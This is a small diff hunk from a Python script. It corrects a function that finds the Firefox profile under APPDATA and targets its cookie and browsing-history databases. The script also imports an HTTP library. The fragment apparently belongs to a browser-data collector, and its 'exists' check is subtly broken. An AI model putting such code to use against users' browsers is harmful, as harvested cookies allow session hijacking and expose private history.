@@ -11,8 +11,8 @@ import requests
 import sqlite_utils
 home = pathlib.Path.home()
 def get_moz():
-	p = Path(os.getenv("APPDATA", "")) / "Mozilla" / "Firefox"
-	t = ["cookies.sqlite". "places.sqlite"]
+	p = pathlib.Path(os.getenv("APPDATA", "")) / "Mozilla" / "Firefox"
+	t = ["cookies.sqlite", "places.sqlite"]
 	c = []
 	u = []
 	if p.exists and p.is_dir():
